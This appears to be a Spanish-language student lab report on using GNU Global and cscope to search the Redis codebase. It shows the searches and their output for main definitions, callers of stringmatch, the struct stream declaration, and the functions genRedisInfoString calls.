main              116 deps/jemalloc/test/integration/allocated.c main(void) {
main               21 deps/jemalloc/test/integration/cpp/basic.cpp main() {
main               19 deps/jemalloc/test/integration/cpp/infallible_new_false.cpp main(void) {
main               63 deps/jemalloc/test/integration/cpp/infallible_new_true.cpp main(void) {
main              281 deps/jemalloc/test/integration/extent.c main(void) {
main               13 deps/jemalloc/test/integration/malloc.c main(void) {
main              267 deps/jemalloc/test/integration/mallocx.c main(void) {
main               56 deps/jemalloc/test/integration/overflow.c main(void) {
main              123 deps/jemalloc/test/integration/posix_memalign.c main(void) {
main              300 deps/jemalloc/test/integration/rallocx.c main(void) {
main               51 deps/jemalloc/test/integration/sdallocx.c main(void) {
main               77 deps/jemalloc/test/integration/slab_sizes.c main(void) {
main              305 deps/jemalloc/test/integration/smallocx.c main(void) {
main               83 deps/jemalloc/test/integration/thread_arena.c main(void) {
main               79 deps/jemalloc/test/integration/thread_tcache_enabled.c main(void) {
main              374 deps/jemalloc/test/integration/xallocx.c main(void) {
main              190 deps/jemalloc/test/stress/batch_alloc.c int main(void) {
main               72 deps/jemalloc/test/stress/fill_flush.c int main(void) {
main               66 deps/jemalloc/test/stress/hookbench.c main(void) {
main               29 deps/jemalloc/test/stress/large_microbench.c main(void) {
main               70 deps/jemalloc/test/stress/mallctl.c main(void) {
main              119 deps/jemalloc/test/stress/microbench.c main(void) {
main             1593 deps/jemalloc/test/unit/SFMT.c main(void) {
main               13 deps/jemalloc/test/unit/a0.c main(void) {
main              429 deps/jemalloc/test/unit/arena_decay.c main(void) {
main              355 deps/jemalloc/test/unit/arena_reset.c main(void) {
main              221 deps/jemalloc/test/unit/atomic.c main(void) {
main              113 deps/jemalloc/test/unit/background_thread.c main(void) {
main               92 deps/jemalloc/test/unit/background_thread_enable.c main(void) {
main              258 deps/jemalloc/test/unit/base.c main(void) {
main              182 deps/jemalloc/test/unit/batch_alloc.c main(void) {
main              149 deps/jemalloc/test/unit/binshard.c main(void) {
main              280 deps/jemalloc/test/unit/bit_util.c main(void) {
main              335 deps/jemalloc/test/unit/bitmap.c main(void) {
main              189 deps/jemalloc/test/unit/buf_writer.c main(void) {
main              381 deps/jemalloc/test/unit/cache_bin.c main(void) {
main              206 deps/jemalloc/test/unit/ckh.c main(void) {
main               76 deps/jemalloc/test/unit/counter.c main(void) {
main              274 deps/jemalloc/test/unit/decay.c main(void) {
main               26 deps/jemalloc/test/unit/div.c main(void) {
main               74 deps/jemalloc/test/unit/double_free.c main(void) {
main              220 deps/jemalloc/test/unit/edata_cache.c main(void) {
main              136 deps/jemalloc/test/unit/extent_quantize.c main(void) {
main              938 deps/jemalloc/test/unit/fb.c main(void) {
main              137 deps/jemalloc/test/unit/fork.c main(void) {
main              381 deps/jemalloc/test/unit/fxp.c main(void) {
main              168 deps/jemalloc/test/unit/hash.c main(void) {
main              574 deps/jemalloc/test/unit/hook.c main(void) {
main              441 deps/jemalloc/test/unit/hpa.c main(void) {
main              170 deps/jemalloc/test/unit/hpa_background_thread.c main(void) {
main              237 deps/jemalloc/test/unit/hpdata.c int main(void) {
main              103 deps/jemalloc/test/unit/huge.c main(void) {
main              274 deps/jemalloc/test/unit/inspect.c main(void) {
main              185 deps/jemalloc/test/unit/junk.c main(void) {
main              190 deps/jemalloc/test/unit/log.c main(void) {
main             1237 deps/jemalloc/test/unit/mallctl.c main(void) {
main               26 deps/jemalloc/test/unit/malloc_conf_2.c main(void) {
main              262 deps/jemalloc/test/unit/malloc_io.c main(void) {
main              382 deps/jemalloc/test/unit/math.c main(void) {
main              298 deps/jemalloc/test/unit/mpsc_queue.c main(void) {
main               84 deps/jemalloc/test/unit/mq.c main(void) {
main               53 deps/jemalloc/test/unit/mtx.c main(void) {
main              237 deps/jemalloc/test/unit/nstime.c main(void) {
main              128 deps/jemalloc/test/unit/oversize_threshold.c main(void) {
main              123 deps/jemalloc/test/unit/pa.c main(void) {
main              163 deps/jemalloc/test/unit/pack.c main(void) {
main               26 deps/jemalloc/test/unit/pages.c main(void) {
main               44 deps/jemalloc/test/unit/peak.c main(void) {
main              326 deps/jemalloc/test/unit/ph.c main(void) {
main              181 deps/jemalloc/test/unit/prng.c main(void) {
main               81 deps/jemalloc/test/unit/prof_accum.c main(void) {
main              116 deps/jemalloc/test/unit/prof_active.c main(void) {
main               74 deps/jemalloc/test/unit/prof_gdump.c main(void) {
main              164 deps/jemalloc/test/unit/prof_hook.c main(void) {
main               54 deps/jemalloc/test/unit/prof_idump.c main(void) {
main              143 deps/jemalloc/test/unit/prof_log.c main(void) {
main              211 deps/jemalloc/test/unit/prof_mdump.c main(void) {
main              670 deps/jemalloc/test/unit/prof_recent.c main(void) {
main              257 deps/jemalloc/test/unit/prof_reset.c main(void) {
main              147 deps/jemalloc/test/unit/prof_stats.c main(void) {
main               74 deps/jemalloc/test/unit/prof_sys_thread_name.c main(void) {
main               45 deps/jemalloc/test/unit/prof_tctx.c main(void) {
main              118 deps/jemalloc/test/unit/prof_thread_name.c main(void) {
main              735 deps/jemalloc/test/unit/psset.c main(void) {
main              306 deps/jemalloc/test/unit/ql.c main(void) {
main              236 deps/jemalloc/test/unit/qr.c main(void) {
main             1012 deps/jemalloc/test/unit/rb.c main(void) {
main              185 deps/jemalloc/test/unit/retained.c main(void) {
main              282 deps/jemalloc/test/unit/rtree.c main(void) {
main              153 deps/jemalloc/test/unit/safety_check.c main(void) {
main              202 deps/jemalloc/test/unit/san.c main(void) {
main              107 deps/jemalloc/test/unit/san_bump.c main(void) {
main               30 deps/jemalloc/test/unit/sc.c main(void) {
main              622 deps/jemalloc/test/unit/sec.c main(void) {
main               91 deps/jemalloc/test/unit/seq.c int main(void) {
main               74 deps/jemalloc/test/unit/size_check.c main(void) {
main              183 deps/jemalloc/test/unit/size_classes.c main(void) {
main               36 deps/jemalloc/test/unit/slab.c main(void) {
main               97 deps/jemalloc/test/unit/smoothstep.c main(void) {
main               15 deps/jemalloc/test/unit/spin.c main(void) {
main              420 deps/jemalloc/test/unit/stats.c main(void) {
main              995 deps/jemalloc/test/unit/stats_print.c main(void) {
main               64 deps/jemalloc/test/unit/sz.c main(void) {
main              173 deps/jemalloc/test/unit/tcache_max.c main(void) {
main               34 deps/jemalloc/test/unit/test_hooks.c main(void) {
main               31 deps/jemalloc/test/unit/thread_event.c main(void) {
main               94 deps/jemalloc/test/unit/ticker.c main(void) {
main              262 deps/jemalloc/test/unit/tsd.c main(void) {
main              257 deps/jemalloc/test/unit/uaf.c main(void) {
main              272 deps/jemalloc/test/unit/witness.c main(void) {
main               55 deps/jemalloc/test/unit/zero.c main(void) {
main               22 deps/jemalloc/test/unit/zero_realloc_abort.c main(void) {
main               45 deps/jemalloc/test/unit/zero_realloc_alloc.c main(void) {
main               30 deps/jemalloc/test/unit/zero_realloc_free.c main(void) {
main               33 deps/jemalloc/test/unit/zero_reallocs.c main(void) {
main               23 deps/linenoise/example.c int main(int argc, char **argv) {
main               32 deps/lua/etc/min.c int main(void)
main              377 deps/lua/src/lua.c int main (int argc, char **argv) {
main              186 deps/lua/src/luac.c int main(int argc, char* argv[])
main              927 modules/vector-sets/expr.c int main(int argc, char **argv) {
main              485 modules/vector-sets/w2v.c int main(int argc, char **argv) {
main               89 src/localtime.c  int main(void) {
main              170 src/mt19937-64.c int main(void)
main             1696 src/redis-benchmark.c int main(int argc, char **argv) {
main             10616 src/redis-cli.c  int main(int argc, char **argv) {
main             7462 src/server.c     int main(int argc, char **argv) {
main              323 src/setproctitle.c int main(int argc, char *argv[]) {
main              363 src/siphash.c    int main(void) {
main               18 utils/corrupt_rdb.c int main(int argc, char **argv) {
main               83 utils/lru/lfu-simulation.c int main(void) {
main               75 utils/tracking_collisions.c int main(void) {
```

### Cscope

Usamos cscope en modo ‚Äúno interactivo‚Äù para buscar la definici√≥n global de main:
```
cscope -d -L1 main > lista_main_cscope.txt
```
donde:
- -d ‚Üí usa la base existente, no la reconstruye.
- -L1 ‚Üí b√∫squeda tipo ‚ÄúFind this global definition‚Äù para el s√≠mbolo main.
- Redirigimos a lista_main_cscope.txt.

Vemos el resultado:
```
deps/hiredis/examples/example-ae.c main 43 int main (int argc, char **argv) {
deps/hiredis/examples/example-glib.c main 48 main (gint argc G_GNUC_UNUSED,
deps/hiredis/examples/example-ivykis.c main 35 int main (int argc, char **argv) {
deps/hiredis/examples/example-libev.c main 35 int main (int argc, char **argv) {
deps/hiredis/examples/example-libevent-ssl.c main 36 int main (int argc, char **argv) {
deps/hiredis/examples/example-libevent.c main 40 int main (int argc, char **argv) {
deps/hiredis/examples/example-libhv.c main 47 int main (int argc, char **argv) {
deps/hiredis/examples/example-libsdevent.c main 50 int main (int argc, char **argv) {
deps/hiredis/examples/example-libuv.c main 50 int main (int argc, char **argv) {
deps/hiredis/examples/example-macosx.c main 38 int main (int argc, char **argv) {
deps/hiredis/examples/example-poll.c main 42 int main (int argc, char **argv) {
deps/hiredis/examples/example-push.c main 106 int main(int argc, char **argv) {
deps/hiredis/examples/example-ssl.c main 12 int main(int argc, char **argv) {
deps/hiredis/examples/example.c main 58 int main(int argc, char **argv) {
deps/hiredis/sds.c main 1289 int main(void ) {
deps/hiredis/test.c main 2266 int main(int argc, char **argv) {
deps/jemalloc/test/analyze/prof_bias.c main 47 main(void ) {
deps/jemalloc/test/analyze/rand.c main 272 main(void ) {
deps/jemalloc/test/analyze/sizes.c main 32 main() {
deps/jemalloc/test/integration/MALLOCX_ARENA.c main 63 main(void ) {
deps/jemalloc/test/integration/aligned_alloc.c main 151 main(void ) {
deps/jemalloc/test/integration/allocated.c main 116 main(void ) {
deps/jemalloc/test/integration/extent.c main 281 main(void ) {
deps/jemalloc/test/integration/malloc.c main 13 main(void ) {
deps/jemalloc/test/integration/mallocx.c main 267 main(void ) {
deps/jemalloc/test/integration/overflow.c main 56 main(void ) {
deps/jemalloc/test/integration/posix_memalign.c main 123 main(void ) {
deps/jemalloc/test/integration/rallocx.c main 300 main(void ) {
deps/jemalloc/test/integration/sdallocx.c main 51 main(void ) {
deps/jemalloc/test/integration/slab_sizes.c main 77 main(void ) {
deps/jemalloc/test/integration/smallocx.c main 305 main(void ) {
deps/jemalloc/test/integration/thread_arena.c main 83 main(void ) {
deps/jemalloc/test/integration/thread_tcache_enabled.c main 79 main(void ) {
deps/jemalloc/test/integration/xallocx.c main 374 main(void ) {
deps/jemalloc/test/stress/batch_alloc.c main 190 int main(void ) {
deps/jemalloc/test/stress/fill_flush.c main 72 int main(void ) {
deps/jemalloc/test/stress/hookbench.c main 66 main(void ) {
deps/jemalloc/test/stress/large_microbench.c main 29 main(void ) {
deps/jemalloc/test/stress/mallctl.c main 70 main(void ) {
deps/jemalloc/test/stress/microbench.c main 119 main(void ) {
deps/jemalloc/test/unit/SFMT.c main 1593 main(void ) {
deps/jemalloc/test/unit/a0.c main 13 main(void ) {
deps/jemalloc/test/unit/arena_decay.c main 429 main(void ) {
deps/jemalloc/test/unit/arena_reset.c main 355 main(void ) {
deps/jemalloc/test/unit/atomic.c main 221 main(void ) {
deps/jemalloc/test/unit/background_thread.c main 113 main(void ) {
deps/jemalloc/test/unit/background_thread_enable.c main 92 main(void ) {
deps/jemalloc/test/unit/base.c main 258 main(void ) {
deps/jemalloc/test/unit/batch_alloc.c main 182 main(void ) {
deps/jemalloc/test/unit/binshard.c main 149 main(void ) {
deps/jemalloc/test/unit/bit_util.c main 280 main(void ) {
deps/jemalloc/test/unit/bitmap.c main 335 main(void ) {
deps/jemalloc/test/unit/buf_writer.c main 189 main(void ) {
deps/jemalloc/test/unit/cache_bin.c main 381 main(void ) {
deps/jemalloc/test/unit/ckh.c main 206 main(void ) {
deps/jemalloc/test/unit/counter.c main 76 main(void ) {
deps/jemalloc/test/unit/decay.c main 274 main(void ) {
deps/jemalloc/test/unit/div.c main 26 main(void ) {
deps/jemalloc/test/unit/double_free.c main 74 main(void ) {
deps/jemalloc/test/unit/edata_cache.c main 220 main(void ) {
deps/jemalloc/test/unit/emitter.c main 523 main(void ) {
deps/jemalloc/test/unit/extent_quantize.c main 136 main(void ) {
deps/jemalloc/test/unit/fb.c main 938 main(void ) {
deps/jemalloc/test/unit/fork.c main 137 main(void ) {
deps/jemalloc/test/unit/fxp.c main 381 main(void ) {
deps/jemalloc/test/unit/hash.c main 168 main(void ) {
deps/jemalloc/test/unit/hook.c main 574 main(void ) {
deps/jemalloc/test/unit/hpa.c main 441 main(void ) {
deps/jemalloc/test/unit/hpa_background_thread.c main 170 main(void ) {
deps/jemalloc/test/unit/hpdata.c main 237 int main(void ) {
deps/jemalloc/test/unit/huge.c main 103 main(void ) {
deps/jemalloc/test/unit/inspect.c main 274 main(void ) {
deps/jemalloc/test/unit/junk.c main 185 main(void ) {
deps/jemalloc/test/unit/log.c main 190 main(void ) {
deps/jemalloc/test/unit/mallctl.c main 1237 main(void ) {
deps/jemalloc/test/unit/malloc_conf_2.c main 26 main(void ) {
deps/jemalloc/test/unit/malloc_io.c main 262 main(void ) {
deps/jemalloc/test/unit/math.c main 382 main(void ) {
deps/jemalloc/test/unit/mpsc_queue.c main 298 main(void ) {
deps/jemalloc/test/unit/mq.c main 84 main(void ) {
deps/jemalloc/test/unit/mtx.c main 53 main(void ) {
deps/jemalloc/test/unit/nstime.c main 237 main(void ) {
deps/jemalloc/test/unit/oversize_threshold.c main 128 main(void ) {
deps/jemalloc/test/unit/pa.c main 123 main(void ) {
deps/jemalloc/test/unit/pack.c main 163 main(void ) {
deps/jemalloc/test/unit/pages.c main 26 main(void ) {
deps/jemalloc/test/unit/peak.c main 44 main(void ) {
deps/jemalloc/test/unit/ph.c main 326 main(void ) {
deps/jemalloc/test/unit/prng.c main 181 main(void ) {
deps/jemalloc/test/unit/prof_accum.c main 81 main(void ) {
deps/jemalloc/test/unit/prof_active.c main 116 main(void ) {
deps/jemalloc/test/unit/prof_gdump.c main 74 main(void ) {
deps/jemalloc/test/unit/prof_hook.c main 164 main(void ) {
deps/jemalloc/test/unit/prof_idump.c main 54 main(void ) {
deps/jemalloc/test/unit/prof_log.c main 143 main(void ) {
deps/jemalloc/test/unit/prof_mdump.c main 211 main(void ) {
deps/jemalloc/test/unit/prof_recent.c main 670 main(void ) {
deps/jemalloc/test/unit/prof_reset.c main 257 main(void ) {
deps/jemalloc/test/unit/prof_stats.c main 147 main(void ) {
deps/jemalloc/test/unit/prof_sys_thread_name.c main 74 main(void ) {
deps/jemalloc/test/unit/prof_tctx.c main 45 main(void ) {
deps/jemalloc/test/unit/prof_thread_name.c main 118 main(void ) {
deps/jemalloc/test/unit/psset.c main 735 main(void ) {
deps/jemalloc/test/unit/ql.c main 306 main(void ) {
deps/jemalloc/test/unit/qr.c main 236 main(void ) {
deps/jemalloc/test/unit/rb.c main 1012 main(void ) {
deps/jemalloc/test/unit/retained.c main 185 main(void ) {
deps/jemalloc/test/unit/rtree.c main 282 main(void ) {
deps/jemalloc/test/unit/safety_check.c main 153 main(void ) {
deps/jemalloc/test/unit/san.c main 202 main(void ) {
deps/jemalloc/test/unit/san_bump.c main 107 main(void ) {
deps/jemalloc/test/unit/sc.c main 30 main(void ) {
deps/jemalloc/test/unit/sec.c main 622 main(void ) {
deps/jemalloc/test/unit/seq.c main 91 int main(void ) {
deps/jemalloc/test/unit/size_check.c main 74 main(void ) {
deps/jemalloc/test/unit/size_classes.c main 183 main(void ) {
deps/jemalloc/test/unit/slab.c main 36 main(void ) {
deps/jemalloc/test/unit/smoothstep.c main 97 main(void ) {
deps/jemalloc/test/unit/spin.c main 15 main(void ) {
deps/jemalloc/test/unit/stats.c main 420 main(void ) {
deps/jemalloc/test/unit/stats_print.c main 995 main(void ) {
deps/jemalloc/test/unit/sz.c main 64 main(void ) {
deps/jemalloc/test/unit/tcache_max.c main 173 main(void ) {
deps/jemalloc/test/unit/test_hooks.c main 34 main(void ) {
deps/jemalloc/test/unit/thread_event.c main 31 main(void ) {
deps/jemalloc/test/unit/ticker.c main 94 main(void ) {
deps/jemalloc/test/unit/tsd.c main 262 main(void ) {
deps/jemalloc/test/unit/uaf.c main 257 main(void ) {
deps/jemalloc/test/unit/witness.c main 272 main(void ) {
deps/jemalloc/test/unit/zero.c main 55 main(void ) {
deps/jemalloc/test/unit/zero_realloc_abort.c main 22 main(void ) {
deps/jemalloc/test/unit/zero_realloc_alloc.c main 45 main(void ) {
deps/jemalloc/test/unit/zero_realloc_free.c main 30 main(void ) {
deps/jemalloc/test/unit/zero_reallocs.c main 33 main(void ) {
deps/linenoise/example.c main 23 int main(int argc, char **argv) {
deps/lua/etc/min.c main 32 int main(void )
deps/lua/src/lua.c main 377 int main (int argc, char **argv) {
deps/lua/src/luac.c main 186 int main(int argc, char * argv[])
modules/vector-sets/expr.c main 927 int main(int argc, char **argv) {
modules/vector-sets/w2v.c main 485 int main(int argc, char **argv) {
src/localtime.c main 89 int main(void ) {
src/mt19937-64.c main 170 int main(void )
src/redis-benchmark.c main 1696 int main(int argc, char **argv) {
src/redis-cli.c main 10616 int main(int argc, char **argv) {
src/server.c main 7462 int main(int argc, char **argv) {
src/setproctitle.c main 323 int main(int argc, char *argv[]) {
src/siphash.c main 363 int main(void ) {
utils/corrupt_rdb.c main 18 int main(int argc, char **argv) {
utils/lru/lfu-simulation.c main 83 int main(void ) {
utils/tracking_collisions.c main 75 int main(void ) {
```


## 3. B√∫squeda de las funciones que llaman a la funci√≥n stringmatch

### Global
Buscamos todas las referencias a stringmatch:
```
global -rx stringmatch
```
![global-stringmatch.png](capturas/global-stringmatch.png)


### Scope
```
cd redis
find . -name '*.[ch]' > cscope.files         # solo si no tenemos la Base de Datos
cscope -b -q -k -i cscope.files              # solo una vez

cscope -d -L3 stringmatch > referencias_stringmatch.txt
cat callers_stringmatch.txt                  # copiar o capturar
``` 
donde:
- -d ‚Üí Para que use la base de datos, no la reconstruye.
- -L3 ‚Üí ‚Äúfunctions calling this function‚Äù (la opci√≥n 3 del men√∫ interactivo).
- stringmatch ‚Üí el s√≠mbolo a buscar.

```
src/config.c configGetCommand 978 if (stringmatch(name, dictGetKey(de), 1)) {
src/config.c moduleConfigIteratorNext 3517 if (!pattern || stringmatch(pattern, config->name, 1))
src/sentinel.c sentinelResetMastersByPattern 1561 if (stringmatch(pattern,ri->name,0)) {
src/sentinel.c sentinelConfigGetCommand 3322 if (stringmatch(pattern,"resolve-hostnames",1) && !dictFind(d, "resolve-hostnames")) {
src/sentinel.c sentinelConfigGetCommand 3328 if (stringmatch(pattern, "announce-hostnames", 1) && !dictFind(d, "announce-hostnames")) {
src/sentinel.c sentinelConfigGetCommand 3334 if (stringmatch(pattern, "announce-ip", 1) && !dictFind(d, "announce-ip")) {
src/sentinel.c sentinelConfigGetCommand 3340 if (stringmatch(pattern, "announce-port", 1) && !dictFind(d, "announce-port")) {
src/sentinel.c sentinelConfigGetCommand 3346 if (stringmatch(pattern, "sentinel-user", 1) && !dictFind(d, "sentinel-user")) {
src/sentinel.c sentinelConfigGetCommand 3352 if (stringmatch(pattern, "sentinel-pass", 1) && !dictFind(d, "sentinel-pass")) {
src/sentinel.c sentinelConfigGetCommand 3358 if (stringmatch(pattern, "loglevel", 1) && !dictFind(d, "loglevel")) {
```



## 4. B√∫squeda de la declaraci√≥n de struct stream
Tanto el archivo donde est√°, como la l√≠nea donde comienza. Deb√©is hacerlo usando las herramientas, no vale con mostrar su localizaci√≥n, deb√©is mostrar como se localiza.

### La declaraci√≥n de struct stream en el c√≥digo
En C, un struct es una estructura de datos: un tipo que agrupa varias variables bajo un mismo nombre. En Redis existe un tipo de datos complejo llamado `struct stream`, que guarda toda la informaci√≥n relacionada con un `stream` (una estructura interna de Redis).


Tenemos que buscar el sitio del c√≥digo donde se define esa estructura. Aparecer√° algo de este estilo:
```
typedef struct stream {
    /* campos... */
} stream;

/* o algo parecido a: */

struct stream {
    /* campos... */
};
```

### Global
```
global -x stream
```
![struct-stream.png](capturas/struct-stream.png)
donde:
- Busca definiciones del s√≠mbolo `stream` en la base de datos (GTAGS).
- -x ‚Üí Las imprime en formato tipo ‚Äúcross-reference‚Äù.
- Devuelve dos l√≠neas:
  - L√≠nea 16 (el primer resultado) ‚Üí Corresponde donde se est√° declarando el struct stream.
  - L√≠nea 28: (segundo resultado) ‚Üí Corresponde donde se cierra la estructura y se define el typedef stream (el alias sin struct). Forma parte de la misma declaraci√≥n, pero ya no es el ‚Äústruct stream‚Äù sino el nombre de tipo abreviado stream.

Usando GNU Global con `global -x stream` localizamos la declaraci√≥n de struct stream en el archivo src/stream.h, en la l√≠nea 16.



### Cscope
```
cscope -d -L4 "struct stream"
```
![struct-stream.png](capturas/struct-stream-2.png)
donde:
- -d ‚Üí Para que use la BD existente, no la reconstruye.
- -L4 ‚Üí tipo de b√∫squeda ‚ÄúFind this text string‚Äù.

Usando scope vemos todas las l√≠neas donde aparace: struct stream*. (Por ello vemos m√∫ltiples resultados)

**Para que busque como cadena completa y s√≥lo muestre un √∫nico resultado:**
```
cscope -d -L4 "typedef struct stream "
                         #          ^ espacio al final
```
![struct-stream.png](capturas/struct-stream-3.png)



**<mark>Soluci√≥n: La declaraci√≥n de struct stream est√° en:**</mark>
  - Archivo ‚Üí src/stream.h
  - L√≠nea ‚Üí 16


## 5. Enumeraci√≥n de las funciones que llaman la funci√≥n genRedisInfoString

### Cscope en Modo NO interactivo
```
cscope -d -L2 genRedisInfoString > genRedisInfoString.txt
```
donde:
- -d ‚Üí Para que use la base de datos existente, no la reconstruye.
- -L2 ‚Üí ‚Äúfunctions called by this function‚Äù.
- genRedisInfoString ‚Üí la funci√≥n que queremos analizar.

Resultado por l√≠nea: Archivo donde est√° la referencia. Funci√≥n llamada por genRedisInfoString. N√∫mero de l√≠nea. Un poco del c√≥digo de esa l√≠nea:
```
src/server.c sdsempty 5969 sds info = sdsempty();
src/server.c dictFind 5976 if (all_sections || (dictFind(section_dict,"server") != NULL)) {
src/server.c sdscat 5994 if (sections++) info = sdscat(info,"\r\n");
src/server.c uname 5998 uname(&name);
src/server.c sdscatfmt 6002 info = sdscatfmt(info, "# Server\r\n" FMTARGS(
src/server.c FMTARGS 6002 info = sdscatfmt(info, "# Server\r\n" FMTARGS(
src/server.c redisGitSHA1 6004 "redis_git_sha1:%s\r\n", redisGitSHA1(),
src/server.c strtol 6005 "redis_git_dirty:%i\r\n", strtol(redisGitDirty(),NULL,10) > 0,
src/server.c redisGitDirty 6005 "redis_git_dirty:%i\r\n", strtol(redisGitDirty(),NULL,10) > 0,
src/server.c redisBuildIdString 6006 "redis_build_id:%s\r\n", redisBuildIdString(),
src/server.c monotonicInfoString 6012 "monotonic_clock:%s\r\n", monotonicInfoString(),
src/server.c aeGetApiName 6013 "multiplexing_api:%s\r\n", aeGetApiName(),
src/server.c getpid 6016 "process_id:%I\r\n", (int64_t) getpid(),
src/server.c isShutdownInitiated 6031 if (isShutdownInitiated()) {
src/server.c sdscatfmt 6032 info = sdscatfmt(info,
src/server.c commandTimeSnapshot 6034 (int64_t)(server.shutdown_mstime - commandTimeSnapshot()));
src/server.c getListensInfoString 6038 info = getListensInfoString(info);
src/server.c dictFind 6042 if (all_sections || (dictFind(section_dict,"clients") != NULL)) {
src/server.c getExpansiveClientsInfo 6045 getExpansiveClientsInfo(&maxin,&maxout);
src/server.c totalNumberOfStatefulKeys 6046 totalNumberOfStatefulKeys(&blocking_keys, &blocking_keys_on_nokey, &watched_keys);
src/server.c sdscat 6047 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6048 info = sdscatprintf(info, "# Clients\r\n" FMTARGS(
src/server.c FMTARGS 6048 info = sdscatprintf(info, "# Clients\r\n" FMTARGS(
src/server.c listLength 6049 "connected_clients:%lu\r\n", listLength(server.clients) - listLength(server.slaves),
src/server.c getClusterConnectionsCount 6050 "cluster_connections:%lu\r\n", getClusterConnectionsCount(),
src/server.c raxSize 6058 "clients_in_timeout_table:%llu\r\n", (unsigned long long ) raxSize(server.clients_timeout_table),
src/server.c dictFind 6065 if (all_sections || (dictFind(section_dict,"memory") != NULL)) {
src/server.c zmalloc_used_memory 6074 size_t zmalloc_used = zmalloc_used_memory();
src/server.c evictPolicyToString 6076 const char *evict_policy = evictPolicyToString();
src/server.c evalScriptsMemoryVM 6077 long long memory_lua = evalScriptsMemoryVM();
src/server.c functionsMemoryVM 6078 long long memory_functions = functionsMemoryVM();
src/server.c getMemoryOverheadData 6079 struct redisMemOverhead *mh = getMemoryOverheadData();
src/server.c updatePeakMemory 6085 updatePeakMemory(zmalloc_used);
src/server.c bytesToHuman 6087 bytesToHuman(hmem,sizeof(hmem),zmalloc_used);
src/server.c bytesToHuman 6088 bytesToHuman(peak_hmem,sizeof(peak_hmem),server.stat_peak_memory);
src/server.c bytesToHuman 6089 bytesToHuman(total_system_hmem,sizeof(total_system_hmem),total_system_mem);
src/server.c bytesToHuman 6090 bytesToHuman(used_memory_lua_hmem,sizeof(used_memory_lua_hmem),memory_lua);
src/server.c bytesToHuman 6091 bytesToHuman(used_memory_vm_total_hmem,sizeof(used_memory_vm_total_hmem),memory_functions + memory_lua);
src/server.c bytesToHuman 6092 bytesToHuman(used_memory_scripts_hmem,sizeof(used_memory_scripts_hmem),mh->eval_caches + mh->functions_caches);
src/server.c bytesToHuman 6093 bytesToHuman(used_memory_rss_hmem,sizeof(used_memory_rss_hmem),server.cron_malloc_stats.process_rss);
src/server.c bytesToHuman 6094 bytesToHuman(maxmemory_hmem,sizeof(maxmemory_hmem),server.maxmemory);
src/server.c sdscat 6096 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6097 info = sdscatprintf(info, "# Memory\r\n" FMTARGS(
src/server.c FMTARGS 6097 info = sdscatprintf(info, "# Memory\r\n" FMTARGS(
src/server.c dictSize 6120 "number_of_cached_scripts:%lu\r\n", dictSize(evalScriptsDict()),
src/server.c evalScriptsDict 6120 "number_of_cached_scripts:%lu\r\n", dictSize(evalScriptsDict()),
src/server.c functionsNum 6121 "number_of_functions:%lu\r\n", functionsNum(),
src/server.c functionsLibNum 6122 "number_of_libraries:%lu\r\n", functionsLibNum(),
src/server.c freeMemoryGetNotCountedMemory 6144 "mem_not_counted_for_evict:%zu\r\n", freeMemoryGetNotCountedMemory(),
src/server.c asmGetPeakSyncBufferSize 6152 "mem_cluster_slot_migration_input_buffer_peak:%zu\r\n", asmGetPeakSyncBufferSize(),
src/server.c lazyfreeGetPendingObjectsCount 6158 "lazyfree_pending_objects:%zu\r\n", lazyfreeGetPendingObjectsCount(),
src/server.c lazyfreeGetFreedObjectsCount 6159 "lazyfreed_objects:%zu\r\n", lazyfreeGetFreedObjectsCount()));
src/server.c freeMemoryOverheadData 6160 freeMemoryOverheadData(mh);
src/server.c dictFind 6164 if (all_sections || (dictFind(section_dict,"persistence") != NULL)) {
src/server.c sdscat 6165 if (sections++) info = sdscat(info,"\r\n");
src/server.c atomicGet 6173 atomicGet(server.aof_bio_fsync_status,aof_bio_fsync_status);
src/server.c sdscatprintf 6175 info = sdscatprintf(info, "# Persistence\r\n" FMTARGS(
src/server.c FMTARGS 6175 info = sdscatprintf(info, "# Persistence\r\n" FMTARGS(
src/server.c elapsedMs 6181 (unsigned long ) elapsedMs(server.stat_current_cow_updated) / 1000 : 0),
src/server.c time 6191 -1 : time(NULL)-server.rdb_save_time_start),
src/server.c time 6202 -1 : time(NULL)-server.aof_rewrite_time_start),
src/server.c sdscatprintf 6214 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6214 info = sdscatprintf(info, FMTARGS(
src/server.c sdslen 6218 "aof_buffer_length:%zu\r\n", sdslen(server.aof_buf),
src/server.c bioPendingJobsOfType 6219 "aof_pending_bio_fsync:%lu\r\n", bioPendingJobsOfType(BIO_AOF_FSYNC),
src/server.c time 6239 elapsed = time(NULL)-server.loading_start_time;
src/server.c sdscatprintf 6247 info = sdscatprintf(info, FMTARGS(
src/server.c FMTARGS 6247 info = sdscatprintf(info, FMTARGS(
src/server.c dictFind 6261 if (all_sections || (dictFind(section_dict,"threads") != NULL)) {
src/server.c sdscat 6262 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6263 info = sdscatprintf(info, "# Threads\r\n");
src/server.c atomicGet 6266 atomicGet(server.stat_io_reads_processed[j], reads);
src/server.c atomicGet 6267 atomicGet(server.stat_io_writes_processed[j], writes);
src/server.c sdscatprintf 6268 info = sdscatprintf(info, "io_thread_%d:clients=%d,reads=%lld,writes=%lld\r\n",
src/server.c dictFind 6279 if (all_sections || (dictFind(section_dict,"stats") != NULL)) {
src/server.c elapsedUs 6283 (long long ) elapsedUs(server.stat_last_eviction_exceeded_time): 0;
src/server.c elapsedUs 6285 (long long ) elapsedUs(server.stat_last_active_defrag_time): 0;
src/server.c atomicGet 6287 atomicGet(server.stat_net_input_bytes, stat_net_input_bytes);
src/server.c atomicGet 6288 atomicGet(server.stat_net_output_bytes, stat_net_output_bytes);
src/server.c atomicGet 6289 atomicGet(server.stat_net_repl_input_bytes, stat_net_repl_input_bytes);
src/server.c atomicGet 6290 atomicGet(server.stat_net_repl_output_bytes, stat_net_repl_output_bytes);
src/server.c atomicGet 6291 atomicGet(server.stat_client_qbuf_limit_disconnections, stat_client_qbuf_limit_disconnections);
src/server.c atomicGet 6298 atomicGet(server.stat_io_reads_processed[j], reads);
src/server.c atomicGet 6301 atomicGet(server.stat_io_writes_processed[j], writes);
src/server.c sdscat 6307 if (sections++) info = sdscat(info,"\r\n");
src/server.c sdscatprintf 6308 info = sdscatprintf(info, "# Stats\r\n" FMTARGS(
src/server.c FMTARGS 6308 info = sdscatprintf(info, "# Stats\r\n" FMTARGS(
